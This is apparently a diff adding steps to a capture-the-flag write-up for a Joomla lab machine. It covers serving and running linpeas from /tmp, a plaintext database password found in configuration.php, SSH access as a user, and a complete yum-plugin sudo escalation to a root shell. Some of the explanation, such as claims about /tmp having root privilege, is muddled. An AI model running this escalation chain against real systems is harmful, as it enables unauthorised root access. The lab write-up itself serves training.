@@ -126,5 +126,71 @@ uid=48(apache) gid=48(apache) groups=48(apache)
 sh: no job control in this shell
 sh-4.2$ 
 ```
+I always knew that the `/tmp` directory always has the root privilege which I can exploit to use linpeas for enumerating
+## Move to the directory containing linpeas.sh set up the python http server
+```
+python3 -m http.server 8000
+```
+```python
+sh-4.2$ cd /tmp
+cd /tmp
+sh-4.2$ ls -la
+ls -la
+total 820
+drwxrwxrwt   2 root   root       24 Jun  2 07:31 .
+dr-xr-xr-x. 17 root   root      244 Dec 14  2019 ..
+-rwsrw-rw-   1 apache apache 839046 May 18 08:50 linpeas.sh
+```
+Then I need to change mode for linpeas.sh into executable, and I was already in the root directory so I can change the action.
+by entering this command:
+```note
+chmod u+x linpeas.sh
+```
+Following up with 
+```
+./linpeas.sh
+```
+I ended up with this line
+```
+uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
+```
+and also
+```
+/var/www/html/configuration.php:        public $password = 'nv5uz9r3ZEDzVjNu';
+```
+# Hurray I got all essential credentials
+I used `ssh` to connect to the target under `jjameson` and found the user flag
+
+
+# Privilege Escalation
+Note: "Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum."
+Therefore, I searched for yum on [GTFOBins](https://gtfobins.github.io/gtfobins/yum/#sudo)
+```python
+[jjameson@dailybugle ~]$ TF=$(mktemp -d)
+[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
+> [main]
+> plugins=1
+> pluginpath=$TF
+> pluginconfpath=$TF
+> EOF
+[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
+> [main]
+> enabled=1
+> EOF
+[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
+> import os
+> import yum
+> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+> requires_api_version='2.1'
+> def init_hook(conduit):
+>   os.execl('/bin/sh','/bin/sh')
+> EOF
+[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# whoami
+root
+sh-4.2# cat /root/root.txt
+```
 
 
